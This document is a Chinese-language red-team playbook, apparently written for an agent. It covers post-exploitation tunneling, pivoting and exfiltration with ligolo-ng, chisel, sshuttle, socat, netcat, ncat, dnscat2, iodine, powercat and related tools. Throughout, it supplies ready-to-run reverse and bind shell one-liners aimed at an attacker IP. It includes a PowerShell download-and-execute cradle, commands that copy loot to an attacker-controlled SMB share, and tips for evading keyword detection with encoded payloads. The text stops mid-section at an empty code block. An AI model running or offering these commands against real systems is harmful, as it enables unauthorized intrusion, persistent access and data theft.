# 隧道、代理与数据传输(Tunneling, Proxying & Exfiltration)

> **何时读本文件**:拿到初始 shell 后需要建立稳定 C2 隧道、做内网穿透/多层跳板(pivot)、穿透只放行 DNS/ICMP/HTTP 出网的防火墙、给工具挂 SOCKS 代理,或在攻击机与目标之间上传/回传文件时。

## 快速决策表

| 任务场景 | 首选工具 | 备选 | 关键区别 |
|---|---|---|---|
| Linux 目标 + root,要全内网透明访问 | ligolo-ng | chisel(R:socks)+ proxychains4 | ligolo 走 TUN 无 SOCKS,nmap/浏览器直接用,性能最好 |
| 目标仅能回连 TCP(含 Windows) | chisel | ligolo-ng | chisel 单二进制、自带 Windows 版、走 HTTP 伪装 |
| 只有 SSH 凭据(无 webshell/RCE) | sshuttle | `ssh -D` SOCKS | sshuttle 透明路由全部流量,`-D` 只给 SOCKS |
| 工具链需要走 SOCKS5 | proxychains4 | proxychains(旧) | 强制任意 TCP 程序过 127.0.0.1:1080 |
| 仅 DNS 出网(完全 TCP/UDP 封锁) | iodine | dns2tcp / dnscat2 | iodine 建全 IP TUN;dns2tcp 定向转发 TCP;dnscat2 自带加密 C2 命令集 |
| 仅 ICMP(ping)出网 | ptunnel | — | TCP over ICMP echo |
| 仅能走 HTTP(S) 代理出网 | proxytunnel | chisel | proxytunnel 专为 SSH 穿 HTTP CONNECT 代理 |
| 明文 shell 加密升级 | ncat `--ssl` | sbd / dbd / socat OPENSSL | ncat 最通用;sbd/dbd 自带 AES 且有 Windows 版 |
| 给目标送文件 | goshs / impacket-smbserver | `python3 -m http.server` | SMB 不需要目标装客户端;goshs 支持上传/WebDAV/认证/HTTPS |
| 从目标回传数据 | impacket-smbserver / goshs | raven / nc | Windows 下 SMB 最省事;HTTP 被监控时用 goshs TLS |
| 443 是唯一可用入站端口 | sslh | — | 443 端口同时复用 SSH/TLS/OpenVPN |
| 双方都在 NAT 后、无端口转发 | pwnat | — | 借 ICMP 打洞实现 NAT-to-NAT 直连 |

## 拿到 shell 后第一件事:建立稳定隧道(决策树)

```text
拿到初始 shell(通常是裸 nc/哑 shell,随时会断)
│
├─ 步骤 0:先稳住当前 shell(选一)
│   ├─ 有 python3 : python3 -c 'import pty;pty.spawn("/bin/bash")' → Ctrl-Z → stty raw -echo; fg → export TERM=xterm
│   ├─ 有 socat  : 直接重打 socat 全交互反向 shell(见 socat 条目),一步到位
│   └─ 攻击端用 penelope -p 4444 接收:自动升级 PTY、自动补全、自动记录会话
│
├─ 步骤 1:探测出网能力(按优先级试)
│   curl -s http://<attacker-ip>:8000  →  wget/curl 都试
│   nslookup <domain>                  →  DNS 解析是否可控
│   ping -c 2 <attacker-ip>            →  ICMP 是否放行
│   env | grep -i proxy; cat /etc/resolv.conf
│
├─ 步骤 2:按出网通道选隧道
│   ├─ 可回连任意 TCP  → ligolo-ng(Linux+root 首选)/ chisel(Windows 或要伪装 HTTP 首选)
│   ├─ 仅 SSH 可达     → sshuttle 一条命令透明组网
│   ├─ 仅 HTTP 代理    → proxytunnel / chisel(chisel 流量本身即 HTTP 载荷)
│   ├─ 仅 DNS          → iodine(全 IP)> dns2tcp(TCP 定向)> dnscat2(C2 命令)
│   ├─ 仅 ICMP         → ptunnel
│   └─ 完全不出网      → 正向监听(bind shell/端口转发)+ 从可达跳板访问:socat/ncat/sbd
│
├─ 步骤 3:按目标环境定方案
│   ├─ Linux root(有 /dev/net/tun)→ ligolo-ng agent / iodine / chisel
│   ├─ Linux 低权限     → chisel(client 不需要 root,>1024 端口)/ dns2tcp(客户端免 root)
│   ├─ Windows          → chisel.exe / powercat / sbd.exe / ligolo agent Windows 版
│   └─ 远端只有 Python  → sshuttle(远端只需 python3,无需装任何东西)
│
└─ 步骤 4:隧道就绪后
    ├─ socks 型隧道 → 配 proxychains4 再跑 nmap -sT / curl / 浏览器
    └─ tun 型隧道(ligolo/iodine)→ 直接路由,无需 proxychains
```

## 核心工具详解

### ligolo-ng — 现代 TUN 反向隧道首选(无需 SOCKS)

**用途**:agent 从目标反向 TLS/TCP 回连 proxy,在攻击机创建 TUN 网卡,像直连内网一样访问任意 TCP/UDP;不依赖 SOCKS、不需要 proxychains。
**安装**:`sudo apt install ligolo-ng`(含 `ligolo-proxy` 与 `ligolo-agent`;跨平台预编译二进制在 `ligolo-ng-common-binaries` 包)
**使用场景**:目标为 Linux root(或 Windows 管理员)、需要跑 nmap/浏览器/多协议工具且追求性能与易用时,优先于 chisel SOCKS。

```bash
# 1) 攻击机:proxy 生成自签证书并监听(默认 0.0.0.0:11601),记录输出中的 fingerprint
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# 2) 目标机:agent 回连(-retry 断线重连,-ignore-cert 跳过证书校验;agent 需 root/TUN)
sudo ligolo-agent -connect <attacker-ip>:11601 -ignore-cert -retry

# 3) 攻击机:创建 TUN 网卡并启用(接口名默认 ligolo)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# 4) ligolo-proxy 交互界面:查看 agent 网卡,选一个目标网段中未用的 IP 配到本地
ifconfig                 # 列出 agent 侧接口,如 10.10.10.128/24
ifconfig 240.0.0.1/24    # 给本地 ligolo 接口分配对应网段地址(官方 README 示例)
sudo ip route add 10.10.10.0/24 dev ligolo   # 攻击机加路由,随后可直接访问 10.10.10.0/24

# 5) 端口转发(反向监听):把攻击机 0.0.0.0:8080 经 agent 转到目标可达的 10.10.10.5:80
listener_add --addr 0.0.0.0:8080 --to 10.10.10.5:80 --tcp

# 多 agent 时切换会话
session
```

**实战要点**:
- proxy 与 agent 两侧都要能操作 TUN(攻击机 proxy 需能 `ip tuntap add`,目标 agent 需 root);低权限目标改用 chisel。
- 正式使用 `-connect` 校验证书:proxy 用 `-cert`/`-key` 指定证书,agent 用 `-fingerprint <sha256>` 固定指纹,避免被中间人。
- relay 未启动时报文不通,REPL 中确认 agent 会话处于 active(`session` 查看);流量不出现在目标进程列表里,只有一条 TLS 外连。
- Windows 目标:用 `ligolo-ng-common-binaries` 里的 `ligolo-agent.exe`,流程相同。

### ligolo-mp — 多人协作版 ligolo(自动管理多 TUN + GUI)

**用途**:ligolo-ng 的客户端-服务端架构升级版,多人同时操作多条并发隧道,自动管理所有 TUN,提供 GUI 面板。
**安装**:`sudo apt install ligolo-mp`
**使用场景**:红队多人协同、同时管理大量 agent 时;单机单隧道用 ligolo-ng 即可。

```bash
# 服务端:agent 监听地址默认 0.0.0.0:11601;-insecure-agents 跳过 agent 证书校验(测试用)
sudo ligolo-mp -agent-addr 0.0.0.0:11601 -insecure-agents
# 守护模式
ligolo-mp -daemon

# 操作端:客户端连到 ligolo-mp 服务端查看/控制隧道(多人可同时接入)
ligolo-mp-client
```

**实战要点**:
- `-max-connection`(默认 1024)与 `-max-inflight` 控制每隧道连接池,大量并发扫描时按需调大。
- agent 侧与 ligolo-ng 兼容体验一致:仍是 agent 反向连接 `-agent-addr` 指定的入口。

### chisel — 反向隧道事实标准(HTTP 载荷 + SSH 加密,单二进制)

**用途**:单个静态二进制同时含 server/client;把 TCP/UDP 隧道封装在 HTTP 中、以 SSH 加密,专穿防火墙;目标只需能回连攻击机一个端口。
**安装**:`sudo apt install chisel`(Kali 默认已装;跨平台预编译版本装 `chisel-common-binaries`,用 `dpkg -L chisel-common-binaries` 定位 Windows .exe 等)
**使用场景**:目标是 Windows 或 Linux 低权限用户、需要 SOCKS 或定向端口映射、想把流量伪装成 HTTP 时。

```bash
# ===== 完整反向隧道流程 =====
# 1) 攻击机(server):监听 8000,允许客户端注册反向隧道(-reverse),加认证
sudo chisel server -p 8000 -reverse --auth <user>:<pass>

# 2) 目标机(client):把 chisel 二进制传上去(见 goshs/smbserver),回连并注册反向 SOCKS
./chisel client <attacker-ip>:8000 R:socks --auth <user>:<pass>
#    攻击机随后获得 127.0.0.1:1080 SOCKS5 入口,配 proxychains4 使用

# 3) 定向反向端口映射:攻击机 3389 → (经目标) 10.0.0.5:3389
./chisel client <attacker-ip>:8000 R:3389:10.0.0.5:3389 --auth <user>:<pass>
#    然后攻击机直接:xfreerdp /v:127.0.0.1:3389

# 4) UDP 也支持(加 /udp 后缀):经目标访问内网 DNS
./chisel client <attacker-ip>:8000 R:5353:10.0.0.53:53/udp --auth <user>:<pass>

# ===== 其他常用形态 =====
# 客户端本地转发:目标机本地 3000 → 经攻击机 → google.com:80(目标出网、攻击机受限时反向用)
./chisel client <attacker-ip>:8000 3000:google.com:80

# 服务端直接提供 SOCKS5(多客户端出口代理)
sudo chisel server -p 8000 --socks5

# 排障必开详细日志(两侧都加)
./chisel client -v <attacker-ip>:8000 R:socks
```

**实战要点**:
- `R:` 前缀 = 在 server(攻击机)侧开监听、流量经 client 出;不带 `R:` = 在 client 侧开监听。方向搞反是最常见错误。
- server 不加 `-reverse` 时客户端的 `R:` 隧道会被拒绝(旧版默认关闭,务必显式加上)。
- Windows 目标用 `chisel.exe`(chisel-common-binaries 包或 GitHub Releases),命令完全一致;传输后先 `certutil -hashfile` 比对完整性。
- `R:socks` 默认监听 server 的 1080 端口,被占用时用 `R:1081:socks` 换端口。

### sshuttle — 透明"穷人 VPN"(SSH 上的全流量路由)

**用途**:在本地用 iptables 把指定网段的流量透明转发进 SSH 隧道;远端只需 python3,无需安装任何服务端。
**安装**:`sudo apt install sshuttle`(Kali 默认已装)
**使用场景**:已拿到目标 SSH 凭据(root 或可 sudo),想一条命令让本机所有工具(nmap/curl/RDP 客户端)直接访问目标内网,而不是逐个配代理。

```bash
# 基本用法:把目标可达的 10.10.10.0/24 路由到本地(需本地 root)
sudo sshuttle -r <user>@<target-ip> 10.10.10.0/24

# 路由目标全部流量(默认路由,慎用,会把 SSH 自身也绕进去需自动排除)
sudo sshuttle -r <user>@<target-ip> 0.0.0.0/0

# 排除特定地址(-x):如排除目标自身与 VPN 网段
sudo sshuttle -r <user>@<target-ip> 10.10.10.0/24 -x 10.10.10.5

# 指定端口与私钥
sudo sshuttle -r <user>@<target-ip>:22 --ssh-cmd "ssh -i <keyfile>" 10.10.10.0/24

# DNS 也走隧道
sudo sshuttle --dns -r <user>@<target-ip> 10.10.10.0/24
```

**实战要点**:
- 只对 TCP 转发生效(新版用 `--method tproxy` 可支持 UDP;`-t/--tmark` 仅用于自定义 tproxy 流量标记),对 ICMP 无效:内网 ping 不通不代表隧道坏了,用 `nmap -sT` 验证。
- 远端必须是 Linux/Unix 且有 python3;对 Windows 目标不可用(Windows 目标走 chisel/ligolo)。
- 只需 SOCKS 不需透明路由时,原生 SSH 就够:`ssh -D 1080 <user>@<target>`(SOCKS5);单端口转发用 `ssh -L 8080:10.0.0.5:80 ...`、反向 `ssh -R 9001:10.0.0.5:3389 ...`。
- 报 `fatal: bad remote` 多为远端 python 不在 PATH,加 `--remote` 无法解决时可显式 `--python <path>`。

### proxychains4 — 把任意 TCP 程序塞进 SOCKS 代理

**用途**:通过 LD_PRELOAD 劫持网络调用,强制动态链接的 TCP 程序经由 SOCKS4/5(或 HTTP)代理出口;chisel `R:socks`、`ssh -D`、ligolo socks 模式的标配搭档。
**安装**:`sudo apt install proxychains4`(Kali 默认已装)
**使用场景**:隧道提供的是 SOCKS 入口(127.0.0.1:1080),而工具本身不支持代理参数时。

```bash
# 配置代理出口(编辑末尾 proxylist 段;默认 chain 模式为 strict)
sudo nano /etc/proxychains4.conf
#   [ProxyList]
#   socks5 127.0.0.1 1080

# 常规用法:命令前加前缀
proxychains4 curl http://10.10.10.5/
proxychains4 nmap -sT -Pn -n 10.10.10.0/24 -p 22,80,443,3389
proxychains4 ssh <user>@10.10.10.5

# 避免输出刷屏,配置里打开 quiet_mode;或用 shell 包装
```

**实战要点**:
- 只对 TCP + 动态链接程序有效:nmap 必须用 `-sT`(全连接)并禁用操作系统探测,SYN 扫描(`-sS`)的 raw socket 会绕过代理直接发包;静态链接二进制无效。
- DNS 默认由 proxy_dns 走代理;仍可能泄露时,业务工具尽量用 IP 直连(`-n`、`--resolve` 类参数)。
- 多级代理:proxylist 里按顺序写多条即成代理链(strict 模式按序全走)。
- GUI/浏览器整窗走代理:`proxychains4 firefox` 常用于基于浏览器的历史漏洞利用与内网 Web 挖掘。

### socat — 双向流转发瑞士军刀(转发/加密/全交互 shell)

**用途**:在任意两个"地址"(TCP/UDP/SSL/EXEC/FILE/PTY…)之间建立双向字节管道;netcat 超集,可做端口转发、加密 shell、TTY 反弹、文件传输。
**安装**:`sudo apt install socat`(Kali 默认已装)
**使用场景**:需要比 nc 更精细控制时:fork 并发、TLS、PTY、跨协议桥接(TCP↔UDP↔Unix socket↔串口)。

```bash
# ===== 全交互反向 shell(一步到 PTY,免 python 升级)=====
# 攻击机:监听并把当前 tty 接上去
socat file:`tty`,raw,echo=0 TCP-LISTEN:443,reuseaddr
# 目标机:回连并执行 bash(pty 分配伪终端)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:<attacker-ip>:443

# ===== 加密(TLS)反向 shell =====
# 攻击机:生成自签证书(一次性)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes
# 攻击机:TLS 监听
socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,verify=0,fork -
# 目标机:TLS 回连并执行 shell
socat OPENSSL:<attacker-ip>:443,verify=0 EXEC:/bin/bash

# ===== bind shell(正向)=====
# 目标机:监听并执行
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
# 攻击机:连接
socat - TCP:<target-ip>:4444

# ===== 端口转发/中继 =====
# 本机 8080 → 内网 10.0.0.5:80(fork 支持并发,reuseaddr 防端口残留)
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.0.0.5:80
# TCP ↔ UDP 桥接:本机 TCP 5353 → UDP DNS
socat TCP-LISTEN:5353,fork,reuseaddr UDP:10.0.0.53:53

# ===== 文件传输 =====
# 接收端(攻击机):监听并落盘(creat 不存在则建,trunc 清空)
socat TCP-LISTEN:4444,reuseaddr OPEN:<file>,creat,trunc
# 发送端(目标机):
socat FILE:<file> TCP:<attacker-ip>:4444
```

**实战要点**:
- 反弹无 `EXEC` 的目标(如嵌入式)可换成 `SYSTEM:'sh'`;`fork` 让 listener 可反复接受连接,one-shot 传输不要加。
- `OPENSSL-LISTEN` 需要 `cert=`+`key=`,客户端用 `verify=0` 跳过校验;正式环境给 `cafile=` 做双向校验。
- 排障三板斧:`-d -d` 详细日志、`-v` 打印数据流(能看到 shell 明文交互)、`reuseaddr` 解决 TIME_WAIT 端口占用。
- socat 也可给只说明文的旧服务套 TLS(见 stunnel),或把 Unix socket 桥成 TCP 供远程调试。

### netcat(nc)— 最基础的监听/连接/传文件工具

**用途**:TCP/UDP 读写原语;反弹 shell 接收端、文件传输、banner 抓取、临时端口监听;所有"第二选择"工具的基线。
**安装**:`sudo apt install netcat-traditional`(Kali 默认 `nc` 为 OpenBSD 变体;传统版二进制为 `nc.traditional`)
**使用场景**:快速一次性监听/连接,不挑环境;nc 几乎在任何 Linux 上都有。

```bash
# ===== 反向 shell 接收端(最常用)=====
nc -lvnp 4444

# ===== 目标端反弹(OpenBSD nc 无 -e,用 fifo 法,任何 nc 通用)=====
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker-ip> 4444 > /tmp/f

# ===== bind shell(需要 -e:传统版/GNU 版支持)=====
nc.traditional -l -p 4444 -e /bin/bash     # 目标机
nc -nv <target-ip> 4444                    # 攻击机连接

# ===== 文件传输 =====
nc -lvnp 4444 > <file>                     # 接收端
nc -nv <attacker-ip> 4444 < <file>         # 发送端,传完 Ctrl-C

# ===== banner 抓取/端口连通性 =====
nc -nv <target-ip> 22
```

**实战要点**:
- Kali 默认 `nc`(OpenBSD 版)没有 `-e`;要 `-e` 用 `nc.traditional`,或直接换 ncat/socat。
- `nc` 监听是 one-shot:断开即退,需要常驻加 `-k`(OpenBSD 版)或换 socat `fork`。
- 反弹 shell 第一时间升级 PTY(见决策树步骤 0),否则 Ctrl-C/su/ssh 交互都会出问题。
- 裸 nc 流量全明文,过 IDS 敏感环境换 ncat `--ssl`/sbd/socat TLS。

### ncat — Nmap 出品的 netcat(SSL + 访问控制 + 常驻)

**用途**:netcat 的现代重实现:原生 `--ssl` 加密、`--allow/--deny` 来源控制、`--keep-open` 常驻监听、IPv6。
**安装**:`sudo apt install ncat`(Kali 默认已装,nmap 套件)
**使用场景**:需要加密通道或想限制谁能连 shell 时;nmap 全家桶环境无脑可用。

```bash
# 官网示例:bind shell,仅允许指定 IP,断开保持监听
ncat -v --exec "/bin/bash" --allow <allowed-ip> -l 4444 --keep-open

# ===== 加密 bind shell =====
ncat -lvnp 4444 --exec /bin/bash --ssl      # 目标机
ncat -v --ssl <target-ip> 4444              # 攻击机连接

# ===== 加密反向 shell =====
ncat -lvnp 4444 --ssl                       # 攻击机监听
ncat --exec /bin/bash --ssl <attacker-ip> 4444   # 目标机回连

# ===== 加密文件通道 =====
ncat -l 4444 --ssl > <file>                 # 接收端
ncat --ssl <attacker-ip> 4444 < <file>      # 发送端
```

**实战要点**:
- `--ssl` 两端都要加;只一端加会握手失败(表现为连上立即断开)。
- `--allow <ip>`(可逗号分隔多个/网段)把 shell 暴露面缩到只剩自己;`--keep-open` + `fork` 行为等价于常驻服务。
- Windows 有 ncat.exe,加密 Windows shell 的最省事方案:`ncat.exe --exec cmd.exe --ssl <ip> <port>`。
- 端口扫描功能被移除,扫描用 nmap;ncat 专注连接/监听/中继。

### penelope — 现代 shell 处理器(自动升级 PTY 的"nc 替代品")

**用途**:监听/连接反向 shell 并自动稳定化:自动 PTY 升级、readline 补全、会话记录、断线自动重监听、多会话管理,兼作文件服务。
**安装**:`sudo apt install penelope`
**使用场景**:攻击端接收 shell 的默认选择——省掉手工 `python pty.spawn` + `stty raw` 流程,且会话可枚举/切换。

```bash
# 监听反弹 shell(接收即自动升级为可交互 shell)
penelope -p 4444

# 作为客户端连接(nc 风格交互)
penelope -c <target-ip> -p <port>

# 提供文件下载服务(serve 模式)
penelope -s <file>

# 多端口同时监听(逗号分隔)
penelope -p 4444,4445,8080
```

**实战要点**:
- 会话自动落盘记录,报告取证直接引用;`-v/-d/-dd` 提高输出与调试级别。
- 与所有反弹载荷兼容(nc/socat/bash 反弹照收),目标端无需任何配合。
- 同时收多个 shell 时用会话列表切换,不必开多个终端窗口。

### goshs — 增强版 SimpleHTTPServer(上传/WebDAV/认证/TLS 一条龙)

**用途**:Go 编写的单文件 HTTP 服务:目录浏览+下载、启用上传、WebDAV、Basic 认证、TLS,替代 `python3 -m http.server` 的渗透特化版。
**安装**:`sudo apt install goshs`
**使用场景**:往目标送工具/载荷,或需要目标能上传文件回传数据(SMB 被封时的首选)。

```bash
# 基础:在指定目录起 HTTP(默认 0.0.0.0:8000)
sudo goshs -i 0.0.0.0 -p 8000 -d /tmp/share

# 上传默认可用(浏览器页面拖拽上传);只收文件可加 -uo(upload-only)并配 -uf <dir> 指定上传目录
goshs -p 8000 -d /tmp/exfil

# 同时开 WebDAV(Windows 可映射网络驱动器)
goshs -p 8000 -w -wp 8080

# Basic 认证 + TLS(pkcs12 证书)
goshs -s -p12 <cert.p12> -p 443 -d /tmp/share -b <user>:<pass>

# 目标侧下载
wget http://<attacker-ip>:8000/<file>
curl -o <file> http://<attacker-ip>:8000/<file>
```

**实战要点**:
- WebDAV 口开在 `-wp` 指定端口,Windows 目标 `net use * http://<attacker-ip>:8080/` 即可像盘符一样拖文件;Linux 侧用 cadaver。
- 匿名 HTTP 传输会被态势感知轻易识别,敏感情境加 `-s` TLS 与 `-b` 认证。
- 上传页是回传哈希/凭据/小文件最快的方式,免 SMB 免共享权限。

### impacket-smbserver — 一行起 SMB 共享(Windows 回传/落地首选)

**用途**:即时匿名/认证 SMB 共享,Windows 目标无需任何第三方工具即可下载(`copy \\ip\share\...`)或回传文件。
**安装**:`sudo apt install impacket-scripts`(Kali 默认已装)
**使用场景**:目标是 Windows 且 SMB(445)可达;SMB1 被禁时必须加 `-smb2support`。

```bash
# 匿名共享(SMB1,老系统)
sudo impacket-smbserver share /tmp/share

# 现代 Windows(SMB2)+ 账号认证
sudo impacket-smbserver -smb2support -user <user> -password <pass> share /tmp/share

# 目标机(Windows)——下载
copy \\<attacker-ip>\share\<file> C:\Temp\
# 目标机(Windows)——回传
net use \\<attacker-ip>\share /user:<user> <pass>
copy C:\Temp\loot.zip \\<attacker-ip>\share\
```

**实战要点**:
- 不加 `-smb2support` 时 Win10/11 会因 SMB1 禁用而失败,这是最高频踩坑。
- Windows 事件日志会记录对共享的访问,授权测试中可用来反查检测覆盖;匿名 SMB1 更易触发告警。
- 445 被边界防火墙拦截时退回 goshs(HTTP/WebDAV)或 chisel 隧道内中继。
- 相关同族:`impacket-smbexec`/`impacket-wmiexec` 执行命令,`impacket-secretsdump` 导凭据(见横向移动参考)。

### dnscat2 — 加密 C2 over DNS(自带命令与文件传输)

**用途**:在 DNS 协议上建立加密 C&C 通道:交互 shell、上传下载、端口转发,几乎能出任何允许递归解析的网络。
**安装**:`sudo apt install dnscat2`(服务端 `dnscat2-server`,客户端在 `dnscat2-client`)
**使用场景**:仅 DNS 出网且需要"带命令集的 C2"(不只是管道)时;也用于验证 DNS 出网监控。

```bash
# ===== 服务端(攻击机,需在 <domain> 的权威 NS 上,或客户端直连模式)=====
sudo dnscat2-server <domain>

# ===== 客户端(目标机)=====
# 走递归 DNS(需 NS 记录把 <domain> 委派到攻击机)
dnscat2 <domain>
# 直连模式(目标能直接 UDP 53 到攻击机,不经递归)
dnscat2 --dns server=<attacker-ip>,port=53 --secret=<key>

# ===== 服务端控制台 =====
windows              # 列出会话
window -i 1          # 进入 1 号命令会话(得到目标 shell)
listen 127.0.0.1:9001 10.10.10.5:22   # 服务端本地 9001 → 目标可达的 22
upload <file>; download <file>
```

**实战要点**:
- 服务端启动时打印每个域名的 `--secret`,客户端直连必须带相同 secret,否则会话建不起来。
- 递归模式需要真实域名委派(NS 记录指向攻击机);没有域名时只能用直连模式。
- 带宽极低(每查询几十字节),适合传命令/小文件,不要用来拖数据库。
- TXT 记录型流量特征明显,蓝队 DNS 日志(grep `<domain>`)必见;红队用它正是为了验证这类监控。

### iodine — IPv4 over DNS(全功能 IP 隧道)

**用途**:把完整 IPv4 流量封装进 DNS,建立 TUN 点对点隧道,隧道上可跑任意协议(SSH/代理/工具直连),是 DNS 隧道里吞吐最高的方案之一。
**安装**:`sudo apt install iodine`(`iodined` 服务端 + `iodine` 客户端)
**使用场景**:仅 DNS 出网且需要"整网 IP 互通"而不是单条 TCP 时;与 dns2tcp 相比功能更全,配置要求也更高(需权威域)。

```bash
# ===== 服务端(攻击机,须是 <tunnel-domain> 的权威 NS;监听 53 需 root)=====
sudo iodined -f -P <password> 10.0.0.1 <tunnel-domain>
#   10.0.0.1 = 服务端隧道 IP(客户端会拿到 10.0.0.2),-f 前台运行便于观察

# ===== 客户端(目标机)=====
# 经系统递归 DNS(需 NS 委派)
sudo iodine -f -P <password> <tunnel-domain>
# 指定 DNS 服务器直连(绕过递归,连通性差时用;-r 强制纯 DNS 编码模式)
sudo iodine -f -r -P <password> <attacker-ip> <tunnel-domain>

# ===== 隧道就绪后(两侧各得 tun 接口 10.0.0.1/10.0.0.2)=====
ssh <user>@10.0.0.2          # 从攻击机 SSH 进目标(配合目标上反连或正向 SSH)
ssh -D 1080 <user>@10.0.0.2  # 再叠一层 SOCKS,内网工具全走隧道
```

**实战要点**:
- 前置条件最重:需要一个可委派的域名(NS 记录指向攻击机 IP),否则只能服务端/客户端同侧测试。
- 客户端先尝试 raw UDP 模式(快),被防火墙丢包后自动降级 DNS 编码;强制降级加 `-r`。
- 吞吐取决于递归服务器缓存与支持的记录类型,极端环境降到几 KB/s 属正常;大文件传输改走 dns2tcp 的定向通道或分块。
- 停止后 `ip addr` 检查 tun 残留;目标侧日志重点在 `/etc/resolv.conf` 指向与高频 TXT/NULL 查询。

### dns2tcp — TCP-over-DNS 定向隧道(客户端免 root)

**用途**:把指定 TCP 资源(如 SSH)封装进 DNS,包比 IP-over-DNS 小、吞吐更好;客户端无需 root。
**安装**:`sudo apt install dns2tcp`(含 `dns2tcpd` 服务端与 `dns2tcpc` 客户端)
**使用场景**:仅 DNS 出网、只需要把个别 TCP 服务(SSH/SOCKS)引出来时;比 iodine 轻、比 dnscat2 通道化(无内建命令集)。

```bash
# ===== 服务端(攻击机)===== 官网示例配置
cat >> .dns2tcpdrc <<END
listen = 0.0.0.0
port = 53
user = nobody
chroot = /root/dns2tcp
pid_file = /var/run/dns2tcp.pid
domain = <tunnel-domain>
key = <secretkey>
resources = ssh:127.0.0.1:22
END
sudo dns2tcpd -f .dns2tcpdrc
# resources 可写多条:resources = ssh:127.0.0.1:22,socks:127.0.0.1:1080

# ===== 客户端(目标机,无需 root)=====
cat >> .dns2tcprc <<END
domain = <tunnel-domain>
resource = ssh
local_port = 2139
key = <secretkey>
END
dns2tcpc -f .dns2tcprc
# 本地 2139 即攻击机 SSH,再叠 SOCKS 出内网
ssh <user>@localhost -p 2139 -D 8090
```

**实战要点**:
- 与 iodine 一样需要 NS 委派;客户端从内网发起,`local_port` 是它在目标侧开的明文入口。
- `resource` 一次一个,换资源改配置重启;多资源场景在服务端 `resources` 里全部列出后客户端切换。
- 客户端免 root 是它对 iodine 的核心优势(低权限 shell 可用)。

### stunnel4 — 给任意明文服务套 TLS 的通用包装器

**用途**:在非 SSL 服务与客户端之间架 SSL/TLS 通道;也可用 `exec=` 把 shell 直接挂在 TLS 端口后,做出加密 bind shell。
**安装**:`sudo apt install stunnel4`
**使用场景**:明文 shell/服务(nc shell、内部 HTTP、数据库)需要过加密链路,或在仅放行 443/SSL 的环境下伪装。

```bash
# 生成自签证书(一次性)
sudo openssl req -x509 -newkey rsa:2048 -keyout /etc/stunnel/stunnel.pem \
  -out /etc/stunnel/stunnel.pem -days 30 -nodes

# ===== 服务端(攻击机):TLS 端口直接挂 bash =====
sudo tee /etc/stunnel/shell.conf <<END
cert = /etc/stunnel/stunnel.pem
[shell]
accept = 0.0.0.0:443
exec = /bin/bash
execArgs = /bin/bash -i
END
sudo stunnel4 /etc/stunnel/shell.conf

# ===== 客户端(攻击机另一台/目标机):把远端 TLS 映射为本地明文端口 =====
sudo tee stunnel-client.conf <<END
client = yes
[shell]
accept = 127.0.0.1:9000
connect = <target-ip>:443
END
sudo stunnel4 stunnel-client.conf
nc 127.0.0.1 9000          # 像连明文 shell 一样使用

# ===== 典型加密中继:把内网明文服务经 stunnel 引到本地 =====
# client = yes;accept = 127.0.0.1:5432;connect = <db-host>:5432(两端各跑一个 stunnel)
```

**实战要点**:
- 服务端必须有 `cert=`;`client = yes` 只能出现在一端,方向写反直接握手失败。
- 调试加 `foreground = yes` 与 `output = /tmp/stunnel.log` 到配置段。
- stunnel 是"加密搬运工",不做认证鉴权;shell 场景配合防火墙白名单或 sslh 端口复用。
- Debian/Kali 的包名、二进制与 systemd 单元都带 4 后缀:二进制 `stunnel4`、服务 `stunnel4.service`(`sudo systemctl start stunnel4`)。

### powercat — PowerShell 版 netcat(Windows 无落地文件的通道)

**用途**:netcat 的 PowerShell 实现:正/反向 shell、文件传输、TLS、DNS 隧道模式,支持生成 payload 字符串,Windows 目标免安装第三方 exe。
**安装**:`sudo apt install powercat`(脚本本体:`/usr/share/windows-resources/powercat/powercat.ps1`)
**使用场景**:Windows 目标、只有 PowerShell 可用、不想落地 nc.exe 时。

```bash
# ===== 反向 shell(攻击机先 nc -lvnp 4444;目标 PowerShell 远程加载执行)=====
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<attacker-ip>:8000/powercat.ps1');powercat -c <attacker-ip> -p 4444 -e cmd"

# ===== bind shell =====
powercat -l -p 4444 -e cmd
nc -nv <target-ip> 4444

# ===== 加密(TLS)反向 shell =====
powercat -c <attacker-ip> -p 4444 -e cmd -tls
powercat -l -p 4444 -tls

# ===== DNS 模式(配合 dnscat2 服务端,域名走 DNS 出网)=====
powercat -c <attacker-ip> -p 53 -dns <domain> -e cmd

# ===== 生成 payload(免二次下载)=====
powercat -l -p 8000 -e cmd -g > rev.ps1      # 生成脚本文件
powercat -c <ip> -p 4444 -e cmd -ge          # 生成 base64 编码 payload
```

**实战要点**:
- `-ge` 生成编码 payload,配合 `powershell -enc <base64>` 执行,绕过简单关键词检测。
- DNS 模式协议与 dnscat2 兼容,攻击端用 `dnscat2-server <domain>` 接。
- 远程加载路径也可用 goshs 提供;断网环境先把 powercat.ps1 写到目标再 `IEX(Get-Content ...)`。

### sbd — 加密 netcat(AES-128,跨 Linux/Windows)

**用途**:netcat 克隆,内建 AES-CBC-128 + HMAC-SHA1 加密,支持 `-e` 执行程序、断线重连;有 Windows 版。
**安装**:`sudo apt install sbd`
**使用场景**:目标两端都能跑独立二进制、需要加密但不想配证书(ncat/socat TLS 要证书,sbd 零配置)。

```bash
# 官网示例:攻击端监听 4444 并执行 bash(-n 不做解析,-v 详细输出)
sbd -l -p 4444 -e bash -v -n
# 目标端连接
sbd <attacker-ip> 4444

# 反向用法(目标机执行 shell 回连攻击端监听)
sbd -l -p 4444 -v -n                       # 攻击端裸监听
sbd -e /bin/bash <attacker-ip> 4444        # 目标端
```

**实战要点**:
- 与 dbd 同源定位,二者参数兼容;选一个装即可,Windows 落地选各自的 .exe。
- 加密是内建的,不提供证书/指纹校验,防的是链路窃听而非中间人。

### dbd — 加密 netcat 克隆(带守护/定时重连)

**用途**:sbd 同类(AES-CBC-128 + HMAC-SHA1),特色是 `-r` 定时自动重连与 `-D` 守护模式,适合需要长驻回连的场景。
**安装**:`sudo apt install dbd`
**使用场景**:shell 稳定性优先、允许目标常驻进程定时回连时。

```bash
